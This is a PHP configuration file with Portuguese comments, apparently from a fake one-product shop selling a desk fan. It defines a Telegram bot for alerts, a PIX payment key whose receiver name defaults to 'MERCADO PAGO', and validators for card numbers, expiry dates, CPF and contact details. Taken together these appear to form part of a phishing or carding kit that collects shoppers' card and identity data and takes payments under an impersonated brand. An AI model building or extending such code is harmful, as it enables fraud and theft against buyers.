<?php
/**
 * ============================================================
 *  CONFIGURAÇÃO CENTRAL — SERVER-SIDE ONLY
 *  Este arquivo NUNCA deve ser acessado diretamente pelo navegador.
 *  Coloque um .htaccess ou bloqueie via nginx.
 *  v5.0 — Validadores robustos, segurança endurecida
 * ============================================================
 */

// ── Carregar .env se existir ──────────────────────────────────
$_envCandidates = [
    __DIR__ . '/../.env',
    __DIR__ . '/.env',
    __DIR__ . '/../../.env'
];
foreach ($_envCandidates as $_cand) {
    if (file_exists($_cand)) {
        foreach (file($_cand, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $_line) {
            if (strpos(trim($_line), '#') === 0 || !strpos($_line, '=')) continue;
            [$_k, $_v] = array_map('trim', explode('=', $_line, 2));
            if (!empty($_k) && !array_key_exists($_k, $_ENV)) {
                $_ENV[$_k] = $_v;
                putenv("{$_k}={$_v}");
            }
        }
        break;
    }
}

// ── Telegram Bot ──────────────────────────────────────────────
define('TG_BOT_TOKEN', $_ENV['TG_BOT_TOKEN'] ?? getenv('TG_BOT_TOKEN') ?: '');
define('TG_OWNER_ID',  $_ENV['TG_OWNER_ID']  ?? getenv('TG_OWNER_ID')  ?: '');
define('TG_CHAT_ID',   ''); // Dinâmico — configurado pelo bot via /start
define('BOT_DATA_FILE', __DIR__ . '/api/bot_data.json');

// ── Validação defensiva: token não pode estar vazio em prod ───
if (empty(TG_BOT_TOKEN) && php_sapi_name() !== 'cli') {
    error_log('[CONFIG] AVISO: TG_BOT_TOKEN não definido. Configure o .env');
}

// ── Chave PIX ─────────────────────────────────────────────────
define('PIX_KEY',           $_ENV['PIX_KEY']            ?? getenv('PIX_KEY')            ?: 'SUA_CHAVE_PIX_AQUI');
define('PIX_RECEIVER_NAME', $_ENV['PIX_RECEIVER_NAME']  ?? getenv('PIX_RECEIVER_NAME')  ?: 'MERCADO PAGO');
define('PIX_CITY',          $_ENV['PIX_CITY']           ?? getenv('PIX_CITY')           ?: 'SAO PAULO');

// ── API de Pagamento ──────────────────────────────────────────
define('PAYMENT_API_URL', 'https://meupagamento.site/api/v1/uniaopay');
define('PAYMENT_API_KEY', $_ENV['PAYMENT_API_KEY'] ?? getenv('PAYMENT_API_KEY') ?: '');

// ── Criptografia ──────────────────────────────────────────────
// Chave mestra para descriptografar payloads do client (AES-256-GCM)
// Gere com: node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
$_rawKey = $_ENV['MASTER_KEY'] ?? getenv('MASTER_KEY') ?: '';
if (empty($_rawKey)) {
    // Fallback seguro: gera uma chave por sessão (não persiste, mas nunca expõe chave fraca)
    $_rawKey = bin2hex(random_bytes(32));
    error_log('[CONFIG] AVISO: MASTER_KEY não definida — usando chave de sessão temporária');
}
define('MASTER_KEY', $_rawKey);

// ── Produto ───────────────────────────────────────────────────
define('PRODUCT_NAME',     'Ventilador De Mesa Mondial 40cm - BIVOLT');
define('PRODUCT_PRICE',    49.90);
define('PRODUCT_CURRENCY', 'BRL');

// ── Segurança ─────────────────────────────────────────────────
define('SESSION_EXPIRY',    3600);   // 1 hora
define('NONCE_EXPIRY',      120);    // 2 minutos — anti-replay window
define('REPLAY_WINDOW',     120);    // 2min anti-replay
define('MIN_FILL_TIME',     3);      // Mínimo 3s para preencher (anti-bot)
define('MAX_INSTALLMENTS',  12);
define('TG_RATE_LIMIT',     20);     // Max msgs/min para Telegram
define('TG_MAX_MSG_LEN',    4096);   // Limite do Telegram por mensagem
define('REQUIRE_ENCRYPTED', true);   // Rejeitar payloads não-criptografados

// ── Timezone ──────────────────────────────────────────────────
date_default_timezone_set('America/Sao_Paulo');

// ── Headers de segurança ──────────────────────────────────────
function setSecurityHeaders() {
    header('X-Content-Type-Options: nosniff');
    header('X-Frame-Options: SAMEORIGIN');
    header('X-XSS-Protection: 1; mode=block');
    header('Referrer-Policy: strict-origin-when-cross-origin');
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    // Sem Server header revelador
    header_remove('X-Powered-By');
}

// ═════════════════════════════════════════════════════════════
//  VALIDADORES DE DADOS — Algoritmos oficiais BR
// ═════════════════════════════════════════════════════════════

/**
 * Valida CPF com algoritmo oficial dos dígitos verificadores.
 * Rejeita sequências repetidas (11111111111, etc).
 */
function validateCPF(string $cpf): bool {
    $cpf = preg_replace('/\D/', '', $cpf);
    if (strlen($cpf) !== 11) return false;
    // Sequências inválidas conhecidas
    if (preg_match('/^(\d)\1{10}$/', $cpf)) return false;
    // Primeiro dígito verificador
    $sum = 0;
    for ($i = 0; $i < 9; $i++) $sum += intval($cpf[$i]) * (10 - $i);
    $r = $sum % 11;
    $d1 = $r < 2 ? 0 : 11 - $r;
    if (intval($cpf[9]) !== $d1) return false;
    // Segundo dígito verificador
    $sum = 0;
    for ($i = 0; $i < 10; $i++) $sum += intval($cpf[$i]) * (11 - $i);
    $r = $sum % 11;
    $d2 = $r < 2 ? 0 : 11 - $r;
    return intval($cpf[10]) === $d2;
}

/**
 * Valida email com regex rigorosa + TLD mínimo 2 chars.
 */
function validateEmail(string $email): bool {
    $email = trim($email);
    if (strlen($email) < 6 || strlen($email) > 254) return false;
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) return false;
    // Verificar TLD com mínimo 2 caracteres
    if (!preg_match('/\.[a-z]{2,}$/i', $email)) return false;
    // Rejeitar domínios sem ponto
    $domain = substr($email, strpos($email, '@') + 1);
    if (!str_contains($domain, '.')) return false;
    return true;
}

/**
 * Valida telefone brasileiro — DDDs reais + formato correto.
 */
function validatePhone(string $phone): bool {
    $digits = preg_replace('/\D/', '', $phone);
    $len = strlen($digits);
    if ($len < 10 || $len > 11) return false;
    // Remover código do país se presente
    if ($len === 12 && substr($digits, 0, 2) === '55') $digits = substr($digits, 2);
    if ($len === 13 && substr($digits, 0, 2) === '55') $digits = substr($digits, 2);
    $ddd = intval(substr($digits, 0, 2));
    // DDDs válidos no Brasil
    $validDDDs = [
        11,12,13,14,15,16,17,18,19, // SP
        21,22,24,                    // RJ
        27,28,                       // ES
        31,32,33,34,35,37,38,        // MG
        41,42,43,44,45,46,           // PR
        47,48,49,                    // SC
        51,53,54,55,                 // RS
        61,                          // DF
        62,64,                       // GO
        63,                          // TO
        65,66,                       // MT
        67,                          // MS
        68,                          // AC
        69,                          // RO
        71,73,74,75,77,              // BA
        79,                          // SE
        81,87,                       // PE
        82,                          // AL
        83,                          // PB
        84,                          // RN
        85,88,                       // CE
        86,89,                       // PI
        91,93,94,                    // PA
        92,97,                       // AM
        95,                          // RR
        96,                          // AP
        98,99                        // MA
    ];
    return in_array($ddd, $validDDDs, true);
}

/**
 * Valida CEP brasileiro (formato básico, 8 dígitos não-nulos).
 */
function validateCEP(string $cep): bool {
    $digits = preg_replace('/\D/', '', $cep);
    if (strlen($digits) !== 8) return false;
    // Sequências inválidas
    if (preg_match('/^(\d)\1{7}$/', $digits)) return false;
    if ($digits === '00000000' || $digits === '99999999') return false;
    return true;
}

/**
 * Valida número de cartão pelo algoritmo Luhn.
 */
function validateCardLuhn(string $number): bool {
    $digits = preg_replace('/\D/', '', $number);
    $len = strlen($digits);
    if ($len < 13 || $len > 19) return false;
    // Rejeitar todos-iguais
    if (preg_match('/^(\d)\1+$/', $digits)) return false;
    $sum = 0;
    $alt = false;
    for ($i = $len - 1; $i >= 0; $i--) {
        $n = intval($digits[$i]);
        if ($alt) {
            $n *= 2;
            if ($n > 9) $n -= 9;
        }
        $sum += $n;
        $alt = !$alt;
    }
    return $sum % 10 === 0;
}

/**
 * Valida validade de cartão (MM/AA ou MM/AAAA).
 * Rejeita datas passadas ou muito distantes no futuro.
 */
function validateCardExpiry(string $expiry): bool {
    if (!preg_match('/^(\d{2})\/(\d{2}|\d{4})$/', trim($expiry), $m)) return false;
    $month = intval($m[1]);
    $year  = intval($m[2]);
    if ($month < 1 || $month > 12) return false;
    if ($year < 100) $year += 2000;
    $now = new DateTime();
    $exp = DateTime::createFromFormat('Y-n-1', "{$year}-{$month}-1");
    $exp->modify('last day of this month');
    // Não pode ser passado
    if ($exp < $now) return false;
    // Não pode ser mais de 15 anos no futuro
    $limit = (clone $now)->modify('+15 years');
    if ($exp > $limit) return false;
    return true;
}

/**
 * Valida nome completo (mínimo 2 palavras, mínimo 6 chars, só letras/acentos/espaços).
 */
function validateFullName(string $name): bool {
    $name = trim($name);
    if (strlen($name) < 6 || strlen($name) > 100) return false;
    // Apenas letras, espaços e caracteres acentuados
    if (!preg_match('/^[\p{L}\s\'-]+$/u', $name)) return false;
    // Mínimo 2 palavras
    $words = array_filter(explode(' ', $name));
    if (count($words) < 2) return false;
    return true;
}

/**
 * Detecta se um campo é claramente inválido / placeholder.
 */
function isPlaceholderValue(string $val): bool {
    $lower = strtolower(trim($val));
    $placeholders = ['teste', 'test', 'aaa', 'bbb', 'foo', 'bar', 'n/a', 'na', 'null', 'undefined', '123', 'abc'];
    return in_array($lower, $placeholders, true);
}

// ── Gerador Oficial de Payload PIX Copia e Cola / BRCode (EMV Standard) ───
function generatePixBRCode($pixKey, $name = 'MERCADO PAGO', $city = 'SAO PAULO', $amount = 49.90, $txId = '***') {
    if (strpos($pixKey, '000201') === 0) {
        return $pixKey;
    }
    $pixKey  = trim($pixKey);
    $name    = substr(strtoupper(preg_replace('/[^A-Za-z0-9 ]/', '', $name)), 0, 25) ?: 'MERCADO PAGO';
    $city    = substr(strtoupper(preg_replace('/[^A-Za-z0-9 ]/', '', $city)), 0, 15) ?: 'SAO PAULO';
    $amountStr = number_format($amount, 2, '.', '');
    $fmt = function($id, $val) {
        return sprintf("%02d%02d%s", $id, strlen($val), $val);
    };
    $gui  = $fmt(0, 'BR.GOV.BCB.PIX');
    $key  = $fmt(1, $pixKey);
    $mai  = $fmt(26, $gui . $key);
    $mc   = $fmt(52, '0000');
    $curr = $fmt(53, '986');
    $amt  = $fmt(54, $amountStr);
    $country = $fmt(58, 'BR');
    $nm   = $fmt(59, $name);
    $ct   = $fmt(60, $city);
    $tx   = $fmt(5, $txId ?: '***');
    $add  = $fmt(62, $tx);
    $payload = "000201" . $mai . $mc . $curr . $amt . $country . $nm . $ct . $add . "6304";
    $crc = 0xFFFF;
    for ($i = 0; $i < strlen($payload); $i++) {
        $crc ^= (ord($payload[$i]) << 8);
        for ($j = 0; $j < 8; $j++) {
            if ($crc & 0x8000) {
                $crc = (($crc << 1) ^ 0x1021) & 0xFFFF;
            } else {
                $crc = ($crc << 1) & 0xFFFF;
            }
        }
    }
    return $payload . strtoupper(sprintf("%04X", $crc));
}
